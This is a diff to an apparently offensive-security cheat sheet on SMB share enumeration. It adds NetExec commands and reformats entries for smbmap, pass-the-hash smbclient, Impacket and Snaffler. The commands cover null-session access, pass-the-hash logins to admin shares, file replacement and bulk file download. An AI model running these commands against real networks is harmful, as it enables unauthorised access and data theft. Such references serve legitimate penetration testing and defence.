@@ -4,7 +4,14 @@
 
 > Some shares can be accessible without authentication, explore them to find some juicy files
 
-* [ShawnDEvans/smbmap - a handy SMB enumeration tool](https://github.com/ShawnDEvans/smbmap)
+
+* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec) - The Network Execution Tool
+  ```ps1
+  nxc smb 10.0.0.4 -u guest -p '' -M spider_plus
+  nxc smb 10.0.0.4 -u guest -p '' --get-file \\info.txt.txt infos.txt.txt  --share OPENSHARE
+  ```
+
+* [ShawnDEvans/smbmap](https://github.com/ShawnDEvans/smbmap) - a handy SMB enumeration tool
   ```powershell
   smbmap -H 10.10.10.10                # null session
   smbmap -H 10.10.10.10 -r PATH        # recursive listing
@@ -12,7 +19,7 @@
   smbmap -H 10.10.10.10 -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password123*"
   ```
 
-* [byt3bl33d3r/pth-smbclient from path-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
+* [byt3bl33d3r/pth-smbclient](https://github.com/byt3bl33d3r/pth-toolkit) from path-toolkit
   ```powershell
   pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
   pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
@@ -22,7 +29,7 @@
   put # replace a file
   ```
 
-* [SecureAuthCorp/smbclient from Impacket](https://github.com/SecureAuthCorp/impacket)
+* [SecureAuthCorp/smbclient](https://github.com/SecureAuthCorp/impacket) from Impacket
   ```powershell
   smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
           Sharename       Type      Comment
@@ -39,7 +46,7 @@
   ls            # list files
   ```
 
-* [smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers](#)
+* [smbclient](#) - from Samba, ftp-like client to access SMB/CIFS resources on servers
   ```powershell
   smbclient -U username //10.0.0.1/SYSVOL
   smbclient //10.0.0.1/Share
@@ -52,8 +59,7 @@
   smb: \> mget *
   ```
 
-
-* [SnaffCon/Snaffler - a tool for pentesters to help find delicious candy](https://github.com/SnaffCon/Snaffler)
+* [SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler) - a tool for pentesters to help find delicious candy
   ```ps1
   snaffler.exe -s - snaffler.log
 
